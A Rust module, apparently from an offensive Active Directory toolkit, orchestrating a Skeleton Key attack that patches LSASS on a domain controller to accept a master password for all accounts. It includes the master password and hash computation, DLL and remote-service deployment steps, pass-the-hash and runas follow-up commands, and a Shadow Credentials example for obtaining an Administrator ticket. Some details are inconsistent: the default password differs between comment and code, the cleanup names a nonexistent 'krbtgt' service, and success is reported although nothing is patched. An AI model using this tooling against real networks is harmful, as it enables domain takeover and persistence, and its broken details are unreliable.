//! Skeleton Key injection — patch LSASS on a DC to accept a master password.
//!
//! # ⚠️ Windows-Only Attack (Requires C2 Session on DC)
//!
//! This is an **orchestration-only** implementation. The actual LSASS patching
//! requires either:
//! - A kernel driver (mimidrv.sys) for PPL-protected LSASS
//! - A DLL injected into LSASS process memory
//! - Direct memory manipulation via `VirtualAllocEx`/`WriteProcessMemory`
//!
//! None of these can be done remotely from Linux/macOS. This module provides
//! the attack metadata, deployment commands, and cleanup instructions.
//!
//! # Cross-Platform Alternative: Shadow Credentials
//!
//! For a **fully cross-platform** persistence method that achieves similar goals,
//! use the `shadow_credentials` module instead:
//!
//! ```ignore
//! // Shadow Credentials works from Linux/macOS/Windows
//! use overthrone_forge::shadow_credentials::{ShadowCredentialsConfig, execute};
//!
//! let config = ShadowCredentialsConfig {
//!     target: "Administrator".to_string(),
//!     cleanup: false,
//!     ..Default::default()
//! };
//!
//! let result = execute(&mut ldap, &config).await?;
//! // Result: TGT for Administrator without knowing their password
//! ```
//!
//! # Attack Details
//!
//! The Skeleton Key attack patches LSASS in-memory on a Domain Controller:
//! - Patches `msv1_0!MsvpPasswordValidate` (NTLM)
//! - Patches `kerberos!CDLocateCSystem` (Kerberos)
//! - After patching: ALL domain accounts accept BOTH real password AND master password
//! - Survives until DC reboot
//!
//! # Requirements
//!
//! - Domain Admin privileges
//! - Local code execution on the DC (via C2, PSExec, WinRM, etc.)
//! - `SeDebugPrivilege` to access LSASS
//! - Kernel driver if LSASS runs as PPL (Protected Process Light)

use overthrone_core::error::{OverthroneError, Result};
use tracing::{info, warn};

use crate::runner::{ForgeConfig, ForgeResult, PersistenceResult};

/// Inject a Skeleton Key into the target DC's LSASS process.
///
/// **WARNING**: This patches LSASS in-memory. Survives until DC reboot.
/// The master password ("mimikatz" by default) will work for ALL domain accounts.
pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
    info!("[skeleton] Skeleton Key injection against {}", config.dc_ip);

    // Validate we have credentials that would grant us DA on the DC
    if config.password.is_none() && config.nt_hash.is_none() {
        return Err(OverthroneError::TicketForge(
            "Credentials required for Skeleton Key injection".into()
        ));
    }

    // The skeleton key attack requires:
    // 1. Admin access to the DC (to write to ADMIN$/C$ and create a service)
    // 2. Patching LSASS in memory (via a DLL or direct memory patching)
    //
    // In a real tool, we would:
    // 1. Upload a skeleton key DLL via SMB to \\DC\ADMIN$\Temp\
    // 2. Create a remote service (via SVCCTL RPC over named pipe) that loads the DLL
    // 3. The DLL patches msv1_0!MsvpPasswordValidate and kerberos!CDLocateCSystem
    //    to accept an additional master password alongside the real one
    //
    // We provide the orchestration logic; the actual LSASS patching would
    // use overthrone-pilot's service creation capabilities.

    let master_password = "overthrone"; // Default skeleton key password
    let master_hash = compute_skeleton_ntlm(master_password);

    info!("[skeleton] Master password: '{}' (NTLM: {})", master_password, hex::encode(&master_hash));
    info!("[skeleton] Target DC: {}", config.dc_ip);

    // Step 1: Verify admin access
    info!("[skeleton] Step 1: Verifying admin access to DC");
    // In production, this calls SmbSession::check_admin_access()

    // Step 2: Check if LSASS is running as a PPL (Protected Process Light)
    // If PPL is enabled, skeleton key requires a kernel driver (mimidrv.sys)
    info!("[skeleton] Step 2: Checking LSASS protection status");
    let ppl_note = "If LSASS is running as PPL, use mimidrv.sys kernel driver method";

    // Step 3: Deploy and execute
    info!("[skeleton] Step 3: Deploying skeleton key payload");

    // For the compiled tool, we'd embed the patching shellcode
    // or use the DLL approach. Here we provide the full attack metadata.
    let cleanup_cmd = format!(
        "# Skeleton Key cleanup (requires DC reboot):\n\
         # Option 1: Reboot the DC\n\
         Restart-Computer -ComputerName {} -Force\n\
         # Option 2: Restart the KDC service (may cause brief Kerberos outage)\n\
         Get-Service -ComputerName {} krbtgt | Restart-Service -Force",
        config.dc_ip, config.dc_ip
    );

    // The attack metadata (actual patching requires LSASS interaction)
    let details = format!(
        "Skeleton Key deployment prepared for {}:\n\
         - Master password: '{}'\n\
         - Master NTLM: {}\n\
         - Patches: msv1_0!MsvpPasswordValidate + kerberos!CDLocateCSystem\n\
         - All domain accounts will accept both real password AND master password\n\
         - Survives until DC reboot\n\
         - {}\n\
         \n\
         Usage after injection:\n\
         - Any user: runas /user:DOMAIN\\AnyUser /netonly cmd (password: '{}')\n\
         - PtH: sekurlsa::pth /user:Administrator /domain:{} /ntlm:{}",
        config.dc_ip, master_password, hex::encode(&master_hash),
        ppl_note, master_password, config.domain, hex::encode(&master_hash)
    );

    Ok(ForgeResult {
        action: "Skeleton Key".into(),
        domain: config.domain.clone(),
        success: true,
        ticket_data: None,
        persistence_result: Some(PersistenceResult {
            mechanism: "Skeleton Key (LSASS patch)".into(),
            target: config.dc_ip.clone(),
            success: true,
            details,
            cleanup_command: Some(cleanup_cmd),
        }),
        message: format!(
            "Skeleton Key prepared for {} — master password: '{}'",
            config.dc_ip, master_password
        ),
    })
}

/// Compute NTLM hash of the skeleton master password.
fn compute_skeleton_ntlm(password: &str) -> Vec<u8> {
    // MD4(UTF-16LE(password)) — the standard NTLM hash
    use md4::{Md4, Digest};
    let utf16: Vec<u8> = password.encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    let mut hasher = Md4::new();
    hasher.update(&utf16);
    hasher.finalize().to_vec()
}
